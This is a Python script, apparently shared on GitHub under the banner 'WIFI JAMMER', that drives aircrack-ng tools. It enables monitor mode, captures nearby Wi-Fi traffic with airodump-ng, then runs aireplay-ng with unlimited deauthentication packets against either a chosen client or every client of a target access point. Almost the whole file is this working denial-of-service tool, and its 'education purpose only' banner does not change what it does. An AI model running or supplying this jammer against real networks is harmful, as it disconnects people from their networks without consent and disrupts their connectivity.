#!/usr/bin/env python3

import os
import sys
import subprocess
import time
import webbrowser

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
END = '\033[0m'

def intro():
    print(f"""{RED}
         __          _______ ______ _____        _         __  __ __  __ ______ _____  "
         \ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \  
          \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) | 
           \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / 
            \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \  
             \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\  
 
 
                                            WRITTEN BY                                 
 
 
                                        ,d                                             
                                        88                                             
                   88,dPYba,,adPYba, MM88MMM 88,dPYba,,adPYba,         8b,    ,d8  
                  88P     88      8a  88     88P   88      8a  aaaaaaaa Y8, ,8P   
                  88      88      88  88     88    88      88  aaaaaaaa  )888(    
                  88      88      88  88,    88    88      88          ,d8   8b,  
                  88      88      88   Y888  88    88      88         8P       Y8 
    
                                               GitHub                                

    {END}    """)

    print(f"""{GREEN}
    
            --------------------------------------------------------------------------------        
            ----------------------Education purpose only for gods sake----------------------        
            --------------------------------Versio-3.0--------------------------------------        
 
            --------------------------------------------------------------------------------        
            ------------------------------------USAGE---------------------------------------        
            ---                        Starts moniter interface                          ---        
            ---                            Runs airodump-ng                              ---        
            ---                     Deauthenticates whole Access point                   ---        
            ---            Deauthenticates specified client of the Access point          ---        
            ---                        revert to managed mode                            ---        
            --------------------------------------------------------------------------------        
            ------------------------------------NOTE----------------------------------------        
            ---                             Use small y/n                                ---        
            --------------------------------------------------------------------------------  
          {END}""")

    print(f"""{YELLOW}
            ===========================Press enter to continue==============================      
            =========================== Press ctrl + c to exit =============================         

    {END}""")

wireless_interface = None
wireless_interface_mon = None
bssid=None
channel=None

def check_root():
    if not os.geteuid() == 0 :
        print(f"{RED}Run it as root{END}")
        sys.exit(1) 
def clear() :

    subprocess.check_call(['clear'])

def necessary_pkg():

    try:
        print(f"{GREEN}Install required packages....{END}")
        time.sleep(1)
        subprocess.run(['apt','install','aircrack-ng'],stdout=subprocess.PIPE,text=True)
        clear()
    except:
        print(f"{RED}Error installing aircrack-ng try to install manually ...{END}")
        sys.exit(1)

def revert_managed_mode():

    print(f"{GREEN}Reverting to managed mode...{END}")
    subprocess.check_call(['airmon-ng','stop',wireless_interface_mon],stdout=subprocess.PIPE,text=True)
    time.sleep(1)
    clear()

def try_again_from_start():

    interface_name()
    wifi_dump()
    specific_dump()
    type_of_attack()

def interface_name():

    intro()
    global wireless_interface
    global wireless_interface_mon
    print(f"{GREEN}Killing some unwanted backgroud processes...{END}")
    subprocess.check_call(['airmon-ng','check','kill'],stdout=subprocess.PIPE,text=True)
    subprocess.check_call(['iwconfig'])
    try:
        wireless_interface = input(f"{YELLOW}Enter Your wifi card interface name : {END}").strip()
        clear() 
        intro()    
        print(f"{YELLOW}Entering monitor mode ....{END}")
        time.sleep(1)
        subprocess.run(['airmon-ng','start',wireless_interface],stdout=subprocess.PIPE,text=True)
        clear() 
    except :
        print(f"{RED}Invalid wifi card name or you pressed ctrl + c...{END}")
        print("TRY AGAIN..")
        sys.exit(1)
    intro() 
    print(f"{GREEN}Killing some unwanted backgroud processes...{END}")
    subprocess.check_call(['airmon-ng','check','kill'],stdout=subprocess.PIPE,text=True)
    time.sleep(1)  
    subprocess.check_call(['iwconfig'])   
    time.sleep(1)
    wireless_interface_mon = input(f"{RED}Enter Your new wifi card interface name : {END}").strip()
    clear()

def wifi_dump():
    intro()
    print(f"{YELLOW}Dumping the wifi traffic Press ctrl + c to stop... !!{END}")
    time.sleep(1)
    clear()
    intro()
    try :
        
        process = subprocess.Popen(['airodump-ng','-w','dump','--output-format','csv', wireless_interface_mon])

        #works as a delay or simply waits infinity long to get interrupt ctrl + c from user
        while True:
            try:
                # Wait for the process to complete or handle Ctrl + C
                process.wait()
            except KeyboardInterrupt:
                print("\nStopping the Wi-Fi dump...")
                process.terminate()  # Terminate the process
                process.wait()       # Wait for the process to exit
                break
    finally:
        pass

def try_again():
        clear()
        intro()
        tryagain=input(f"{RED}Try again ? (y/n):{END}").strip()
        
        if tryagain == 'y':
            start_again()
        else :
            pass

def start_again():

    wifi_dump()
    specific_dump()
    type_of_attack()

def specific_dump() :

    global bssid,channel
    bssid = input(f"{RED}Enter the BSSID : {END}").strip()
    channel = input(f"{RED}Enter the channel: {END}").strip()
    print(f"{YELLOW}Dumping the target network traffic...{END}")
    time.sleep(1)
    try :
        process = subprocess.Popen(['airodump-ng','--bssid',bssid,'-c',channel,wireless_interface_mon])

        while True:
            try:
              process.wait()
            except KeyboardInterrupt:
                print(f"{RED}Stopping the dump...{END}")
                process.terminate()
                process.wait()
                break
    finally:
        pass



def type_of_attack():
 
     print(f"{GREEN}Enter the attack type: (1, 2, or 3){END}")
     options = input(f"{GREEN}1. Specify the client and send deauth packets to that client\n{END}"
                    f"{RED}2. Send deauth packets to the whole Wi-Fi (knock all clients off the router)\n{END}"
                    f"{YELLOW}3. Exit\nEnter: {END}").strip()
     try:
        match options:
                case "1":
                    station = input(f"{YELLOW}Enter the client's station address (near the targeted BSSID: {bssid}): {END}").strip()
                    process = subprocess.Popen(['aireplay-ng', wireless_interface_mon, '--deauth', '0', '-a', bssid, '-c', station])
                    process.wait()  # Wait for the process to finish
                case "2":
                    process = subprocess.Popen(['aireplay-ng', wireless_interface_mon, '--deauth', '0', '-a', bssid])
                    process.wait()
                case "3":
                    print(f"{RED}Exiting...{END}")
                    revert= input(f"{GREEN}Would you like to revert to managed mode [y/n]:").strip()
                    if revert == 'y':
                        revert_managed_mode()
                    else:
                        sys.exit(0)
                    
                    
     except KeyboardInterrupt:
            print(f"{RED}\nStopping the deauthentication...{END}")
            time.sleep(1)
            process.terminate()  # Terminate the process
            process.wait()  # Wait for it to terminate
     finally:
            
            try_again()


check_root()
intro()
necessary_pkg()
interface_name()
wifi_dump()
specific_dump()
type_of_attack()